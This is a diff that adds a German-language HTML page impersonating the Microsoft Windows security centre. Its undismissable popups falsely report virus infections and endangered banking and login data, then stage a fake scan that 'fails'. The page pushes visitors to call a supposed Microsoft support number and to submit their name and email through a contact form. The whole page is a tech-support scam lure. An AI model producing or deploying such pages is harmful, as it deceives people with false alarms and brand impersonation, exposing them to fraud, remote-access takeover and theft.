@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="de">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Windows Bereinigungsprüfung</title>
+    <link rel="icon" href="modal-logo.png" type="image/png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
+    <link href="styles.css" rel="stylesheet">
+  </head>
+  <body>
+    <main class="app-shell" aria-hidden="true"></main>
+
+    <div class="modal fade scan-entry-modal" id="scanModal" tabindex="-1" aria-labelledby="scanModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="background-popup" aria-hidden="true"></div>
+          <div class="front-popup">
+            <div class="modal-header border-0">
+              <h2 class="modal-title scan-title" id="scanModalLabel">
+                <img src="modal-logo.png" alt="" class="scan-logo">Microsoft Windows Sicherheitscenter
+
+              </h2>
+            </div>
+            <div class="modal-body">
+              <div class="scan-copy scan-warning mb-4">
+                <p class="warning-headline"><strong>Virus-/Malware-Infektionen wurden auf Ihrem Gerät erkannt.</strong></p>
+                <p class="warning-details">
+                  <strong>IP-Adresse:</strong> <span id="userIP">23.93.78.244</span> <span id="currentDateTime"></span><br>
+                  
+                </p>
+                <div class="warning-icons">
+                  <img src="modal-logo.png" alt="" class="warning-icon-img">
+                  <span class="warning-icon-circle warning-icon-shield">&#128737;</span>
+                  <span class="warning-icon-circle warning-icon-orange"></span>
+                  <span class="warning-icon-circle warning-icon-blue"></span>
+                </div>
+                <p class="warning-risk"><strong>Ihre persönlichen Daten, Bankinformationen und Web-Anmeldedaten auf diesem PC sind aufgrund einer schwerwiegenden Sicherheitsverletzung gefährdet.</strong></p>
+               
+              </div>
+              <button type="button" class="btn btn-primary scan-action w-100" id="scanButton">
+                <i class="bi bi-search me-2"></i>Jetzt scannen
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal fade" id="progressModal" tabindex="-1" aria-labelledby="progressModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="modal-body p-4">
+            <div class="d-flex align-items-center gap-3 mb-3">
+              <div class="spinner-border text-primary" role="status" aria-hidden="true"></div>
+              <div>
+                <h2 class="fs-5 mb-1" id="progressModalLabel">Scan wird durchgeführt</h2>
+                <p class="text-secondary mb-0" id="scanStatus">Temporäre Dateien werden überprüft...</p>
+              </div>
+            </div>
+            <div class="scan-steps" id="scanSteps" aria-label="Scan steps">
+              <div class="scan-step" data-step="0">
+                <i class="bi bi-hourglass-split"></i>
+                <span>Temporäre Dateien</span>
+              </div>
+              <div class="scan-step" data-step="1">
+                <i class="bi bi-hourglass-split"></i>
+                <span>Browser-Cache</span>
+              </div>
+              <div class="scan-step" data-step="2">
+                <i class="bi bi-hourglass-split"></i>
+                <span>Autostart-Elemente</span>
+              </div>
+              <div class="scan-step" data-step="3">
+                <i class="bi bi-hourglass-split"></i>
+                <span>Systembereinigungsstatus</span>
+              </div>
+            </div>
+            <div class="progress" role="progressbar" aria-label="Scan progress" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
+              <div class="progress-bar" id="scanProgress" style="width: 0%">0%</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal fade" id="resultModal" tabindex="-1" aria-labelledby="resultModalLabel" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered modal-xl">
+        <div class="modal-content result-modal-content">
+          <button type="button" class="btn-close result-close-btn" data-bs-dismiss="modal" aria-label="Close"></button>
+          <div class="result-grid">
+
+            <!-- LEFT: Warning Content -->
+            <div class="result-left">
+              <div class="result-left-header">
+                <img src="modal-logo.png" alt="" class="scan-logo">
+                <h2 class="result-heading" id="resultModalLabel">Scan konnte nicht abgeschlossen werden</h2>
+              </div>
+
+              <div class="support-callout">
+                <i class="bi bi-telephone-fill"></i>
+                <div>
+                  <span>Support-Telefonnummer</span>
+                  <a href="tel:08001820001">0800 18 20001</a>
+                </div>
+              </div>
+
+              <div class="threat-card">
+                <div class="threat-icon">
+                  <i class="bi bi-shield-exclamation"></i>
+                </div>
+                <div class="threat-info">
+                  <h3>Sicherheitswarnung</h3>
+                  <p>Beim Systemscan ist ein Fehler aufgetreten. Es wurden potenzielle Bedrohungen erkannt, die sofortige Aufmerksamkeit erfordern.</p>
+                </div>
+              </div>
+
+              <ul class="risk-list">
+                <li>
+                  <i class="bi bi-exclamation-triangle-fill"></i>
+                  <span>Temporäre Dateien enthalten verdächtige Daten</span>
+                </li>
+                <li>
+                  <i class="bi bi-exclamation-triangle-fill"></i>
+                  <span>Browser-Cache zur Überprüfung markiert</span>
+                </li>
+                <li>
+                  <i class="bi bi-exclamation-triangle-fill"></i>
+                  <span>Autostart-Elemente konnten nicht verifiziert werden</span>
+                </li>
+                <li>
+                  <i class="bi bi-exclamation-triangle-fill"></i>
+                  <span>Systembereinigungsstatus unvollständig</span>
+                </li>
+              </ul>
+
+              <p class="result-cta-text">
+                <i class="bi bi-info-circle-fill"></i>
+                Kontaktieren Sie den Microsoft-Support unter <a href="tel:08001820001">0800 18 20001</a> oder senden Sie eine Nachricht über das Formular.
+              </p>
+            </div>
+
+            <!-- RIGHT: Contact Form -->
+            <div class="result-right">
+              <h3 class="form-heading"><i class="bi bi-envelope-fill"></i> Kontaktieren Sie uns</h3>
+              <p class="form-subtext">Füllen Sie das untenstehende Formular aus und unser Support-Team wird sich in Kürze bei Ihnen melden.</p>
+
+              <form id="contactForm" class="result-form">
+                <div class="form-group">
+                  <label for="name" class="form-label">Vollständiger Name</label>
+                  <div class="input-icon-wrap">
+                    <i class="bi bi-person-fill"></i>
+                    <input type="text" class="form-control" id="name" name="name" placeholder="Ihren Namen eingeben" required>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label for="email" class="form-label">E-Mail-Adresse</label>
+                  <div class="input-icon-wrap">
+                    <i class="bi bi-envelope-fill"></i>
+                    <input type="email" class="form-control" id="email" name="email" placeholder="Ihre E-Mail eingeben" required>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label for="message" class="form-label">Nachricht</label>
+                  <textarea class="form-control" id="message" name="message" rows="4" required>Der Scan konnte nicht abgeschlossen werden. Bitte kontaktieren Sie mich.</textarea>
+                </div>
+                <div class="form-actions">
+                  <button type="submit" class="btn btn-primary form-submit-btn">
+                    <i class="bi bi-send-fill me-2"></i>Nachricht senden
+                  </button>
+                  
+                </div>
+              </form>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="script.js"></script>
+  </body>
+</html>
